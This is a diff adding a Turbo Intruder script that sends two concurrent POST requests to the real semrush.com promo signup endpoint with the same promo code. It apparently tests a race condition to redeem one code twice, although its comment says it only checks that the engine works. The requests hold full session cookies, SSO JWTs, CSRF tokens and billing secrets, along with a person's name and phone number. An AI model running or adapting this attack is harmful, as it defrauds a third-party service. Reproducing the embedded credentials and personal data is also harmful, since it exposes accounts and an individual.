@@ -1,0 +1,59 @@
+# This is just for making sure the engine works during development
+# Launch with java -jar build/libs/turbo-intruder-all.jar resources/examples/test.py /dev/null z z
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint='https://www.semrush.com',
+                           concurrentConnections=2,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+
+    onePayload = '''POST /signup/promo/ HTTP/1.1
+Host: www.semrush.com
+Cookie: ref_code=__default__; visit_first=1620830474250; _ga=GA1.2.1024976018.1620830475; __pdst=d8ea5259c84c425bade9d3003714f06a; mindboxDeviceUUID=42871fcc-2bce-4287-a384-1ce12738cb53; directCrm-session=%7B%22deviceGuid%22%3A%2242871fcc-2bce-4287-a384-1ce12738cb53%22%7D; _mkto_trk=id:519-IIY-869&token:_mch-semrush.com-1620830477569-69175; __insp_uid=1684001666; __smrh_jsch_cuid=d59768a7c3bfdb6a02d45a611ec558be4fc2725b32ae491986032d915fd602f3594bf98d2faeba962f78eced90d462197fdbc4d79e085716d75ba00fbe3aadd9e9; PHPSESSID=e7a1095f7c9d845fa7405ad01bc07fd2; SSO-JWT=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJlN2ExMDk1ZjdjOWQ4NDVmYTc0MDVhZDAxYmMwN2ZkMiIsImlhdCI6MTYzNDY1NTM1NSwiaXNzIjoic3NvIiwidWlkIjo3NTMyMzEwfQ.2E1mMWUsHt4y5WEQp502CmRB8MY8VrnJQoAzqL0EE4TLtjGKmEIO8AFpRf-XtyneS3mbKA47gO4zk5heL-GPgw; _gid=GA1.2.246932739.1634567652; cookiehub=eyJhbnN3ZXJlZCI6ZmFsc2UsInByZWNvbnNlbnQiOnRydWUsInJldmlzaW9uIjoxLCJkbnQiOmZhbHNlLCJhbGxvd1NhbGUiOnRydWUsImltcGxpY3QiOnRydWUsInJlZ2lvbiI6IkcwIiwidG9rZW4iOiJnWjdSTDFkZVdiUnR2NHdiREJpRnQ5Q0JUUVRpRW5vVklBSmRFZGw4Qm9DMzlUQjJBWDRJOGFwR3VJb09GdVRFIiwidGltZXN0YW1wIjoiMjAyMS0xMC0xOFQxNDozNDoxMC45OTNaIiwiY2F0ZWdvcmllcyI6W3siY2lkIjoxLCJpZCI6Im5lY2Vzc2FyeSIsInZhbHVlIjp0cnVlLCJwcmVjb25zZW50Ijp0cnVlLCJmaXJlZCI6ZmFsc2V9LHsiY2lkIjoyLCJpZCI6InByZWZlcmVuY2VzIiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOnRydWUsImZpcmVkIjpmYWxzZX0seyJjaWQiOjMsImlkIjoiYW5hbHl0aWNzIiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOnRydWUsImZpcmVkIjpmYWxzZX0seyJjaWQiOjQsImlkIjoibWFya2V0aW5nIiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOnRydWUsImZpcmVkIjpmYWxzZX0seyJjaWQiOjUsImlkIjoidW5jYXRlZ29yaXplZCIsInZhbHVlIjp0cnVlLCJwcmVjb25zZW50Ijp0cnVlLCJmaXJlZCI6ZmFsc2V9XX0=; _gcl_au=1.1.1903872742.1634567653; _rdt_uuid=1634567668943.138cc35f-b30a-405e-af5d-22aab521fec9; usertype=Free-User; G_ENABLED_IDPS=google; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; billing_csrf_cookie=billing_csrf_cookie; GCLB=CKjyvJL6mrrSpgE; __smrh_jsch_clear=1e4363a2aaafff25ef8ba309449f41de695e9dd9cb1422e02bdde3122c5acf4c0f8e44a7d3c116392cbcb2be147fc2078e6a3d431852c55668370a32b7ad3471b47e8e2a2505aa43dec1ce3c893672f00890f01301674e927fe474ff08a6e5a410744d529b74295469d9fc511593bfdfce26d7d74b9c65db117d899b0ab008bce27a49e9006b7b5185ee549ebbccadb8c8adcb4d63059044b3e7952012a5ceb67dcc6a453eb0ba8056ab2ab65ab16c6c14659c; lux_uid=163465532727370999; ga_exp_c41234be21bd4796bbf8e763=0; site_csrftoken=b9ONswaq9FPRYChAmwon36rtTjKNksU7uFhoaJYaR4U92cDUVJ5R5BRqCsYmZl1C; sso_token=be37ac210da2cd8cdd4a96f7b2b1c1eb8cf6b8cbb13dfa5f783228cc1987f645; db=us; __insp_wid=861992209; __insp_slim=1634655432700; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vYmlsbGluZy1hZG1pbi9wcm9maWxlL3N1YnNjcmlwdGlvbg%3D%3D; __insp_targlpt=U2VtcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; offer_buy_secret=offer_order_rand_616edce1a87620.62134083; offer_buy_secret_expire=i0s06mnb1eparHnuvkPrethvzQ3WHUS1fNH6MEawMY8%3D; refer_source=""; _uetsid=80507510302011ecae3b593b60dbecd8; _uetvid=f9c53c80dcd811ebaf365b9a37926d8a; _gat=1
+User-Agent: Mozilla/5.0 (Windows NT %s10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.semrush.com/signup/promo/
+Content-Type: application/json
+X-Csrftoken: uFUjC9K1aApyAd7PXQwJAOpaqHN1Z81BNbnUkmyLSZuQENt9w3ddCjP79Q1AE186
+Origin: https://www.semrush.com
+Content-Length: 96
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+{"promo":"PROPHET-T40IKU64","name":"Aditya Singh","phone":"+918553825023","order_timezone_minute":-330}
+'''
+    engine.queue(onePayload, 'BFxmG4QMgVRc')
+
+    twoPayloads = '''POST /signup/promo/ HTTP/2
+Host: www.semrush.com
+Cookie: __smrh_jsch_cuid=616adc55951d2eb3147c82b1a887f198ef3af188289d9d138d08e7abe66eb8683558b18f5cb477f86e60f57d6b71a283492ad435f5103de07d39a5696aec19c650; GCLB=CN-Apo-LqrGAGQ; __smrh_jsch_clear=553098e98f6b2f77d66f42d2cbc2ac6a08425256141f1a7b530efbd2934c60d4e05d71f3338b2a0c4fb0e98cf60e7fea4cdd230e2914e66cfb91228b85c6885101e953528b90459acba0b7e0d7ef4f79e8805df8d147884ed143180250bdf8cfdc010241833eb167c48c33ccbbf3ecb70284a06e96735cc7e80b15816582c91f9747b2ddd83ac65640ec56ed21b386d05ff1aea6deae4b838aea7bfffb1fb3effd9f27cd45b07e469b653e0a5f6b8a169393; PHPSESSID=d8cec7cb230549aeff835020b7c021b8; SSO-JWT=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkOGNlYzdjYjIzMDU0OWFlZmY4MzUwMjBiN2MwMjFiOCIsImlhdCI6MTYzNDY1NTM3MCwiaXNzIjoic3NvIiwidWlkIjo5Nzg3MTQ1fQ.qOgvgkaRdZbQst4rgnTUBbRol2ogr5dKFQ8QDJ_0BjjEwvJukLg7R4w1WD7aE9mVxUMTjgLwyZbyk7uPvK1t3w; ga_exp_019eb6b884084dfd8f322ad3=0; ref_code=__default__; lux_uid=163465534477864876; visit_first=1634655344884; ga_exp_c41234be21bd4796bbf8e763=1; cookiehub=eyJhbnN3ZXJlZCI6ZmFsc2UsInByZWNvbnNlbnQiOnRydWUsInJldmlzaW9uIjoxLCJkbnQiOnRydWUsImFsbG93U2FsZSI6dHJ1ZSwiaW1wbGljdCI6dHJ1ZSwicmVnaW9uIjoiRzAiLCJ0b2tlbiI6IldvT2l4TDFuWmdTUXptRUN4R3pWOEhzNGFUUjdKeUF6UUZuUmUwM2cwbm5TaEpRRkRTUk5VT1ZXMlJPaWZWR0YiLCJ0aW1lc3RhbXAiOiIyMDIxLTEwLTE5VDE0OjU1OjQ0Ljg0NloiLCJjYXRlZ29yaWVzIjpbeyJjaWQiOjEsImlkIjoibmVjZXNzYXJ5IiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOnRydWUsImZpcmVkIjpmYWxzZX0seyJjaWQiOjIsImlkIjoicHJlZmVyZW5jZXMiLCJ2YWx1ZSI6dHJ1ZSwicHJlY29uc2VudCI6dHJ1ZSwiZmlyZWQiOmZhbHNlfSx7ImNpZCI6MywiaWQiOiJhbmFseXRpY3MiLCJ2YWx1ZSI6dHJ1ZSwicHJlY29uc2VudCI6dHJ1ZSwiZmlyZWQiOmZhbHNlfSx7ImNpZCI6NCwiaWQiOiJtYXJrZXRpbmciLCJ2YWx1ZSI6dHJ1ZSwicHJlY29uc2VudCI6dHJ1ZSwiZmlyZWQiOmZhbHNlfSx7ImNpZCI6NSwiaWQiOiJ1bmNhdGVnb3JpemVkIiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOnRydWUsImZpcmVkIjpmYWxzZX1dfQ==; _gcl_au=1.1.1760779193.1634655346; __pdst=12e8ef4e4ec640ba938d694db98742f4; _rdt_uuid=1634655346714.bf8dae9b-9331-40fd-bac8-86c4f8c8af08; _uetsid=a444ce8030ec11ec80377b05616d810d; _uetvid=a445005030ec11ecac65095674412a39; site_csrftoken=nMq24GSvFs144ROdzp4GuB0LcXEojK8zjki9yuEUF3k63wVNpxeWRAemlqUXiZ4r; G_ENABLED_IDPS=google; sso_token=e5859f0eeba11e54a676bee89af1850d51b3ad4ba4f54265b7fa616589bd0af1; billing_csrf_cookie=billing_csrf_cookie; usertype=Free-User; db=us; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; refer_source=""
+User-Agent: Mozilla/5.0 (Windows NT 10.0%s; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.semrush.com/signup/promo/
+Content-Type: application/json
+X-Csrftoken: p6Fgb8iK4YOtJiXeYxuIKwQ4ssJFZKt9lExnFW494z7vIX4OOFEY7v4FBVZeYZp1
+Origin: https://www.semrush.com
+Content-Length: 96
+Dnt: 1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+{"promo":"PROPHET-T40IKU64","name":"Aditya Singh","phone":"+918553825023","order_timezone_minute":-330}
+'''
+
+    engine.queue(twoPayloads, '69B9yfqe4cSm')
+
+
+
+def handleResponse(req, interesting):
+    table.add(req)
